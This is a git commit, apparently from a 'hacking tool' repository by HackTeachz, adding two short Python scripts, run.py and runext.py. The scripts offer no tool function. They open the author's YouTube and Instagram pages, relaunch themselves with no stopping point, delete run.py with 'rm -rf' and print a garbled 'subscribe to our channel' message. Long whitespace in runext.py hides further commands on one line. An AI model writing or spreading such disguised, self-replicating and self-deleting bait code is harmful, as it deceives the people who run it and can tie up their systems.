d633d0cde61c7895e3b49dc2b36272d389edae2c
HackTeachz <67002391+HackTeachz@users.noreply.github.com>
2020-09-16 21:46:21 +0530

    Add files via upload

---
+++ run.py
@@ -0,0 +1,8 @@
+import os
+os.system("xdg-open https://youtube.com/HackTeachz")
+os.system("python run.py")
+os.system("xdg-open https://instagram.com/HackTeachz")
+os.system("rm -rf run.py")
+os.system("python runext.py")
+os.system("clear")
+print("\nSorry this os tool is unable on this\n time to subscribe to HackTeachz channel comming soon this tool\n")
---
+++ runext.py
@@ -0,0 +1,4 @@
+import os
+os.system("python runext.py")
+os.system("xdg-open https://instagram.com/HackTeachz")
+os.system("rm -rf run.py")                                   os.system("clear")                                         print("\nSorry this os tool is unable on this\n time to subscribe to HackTeachz channel comming soon this tool\n")
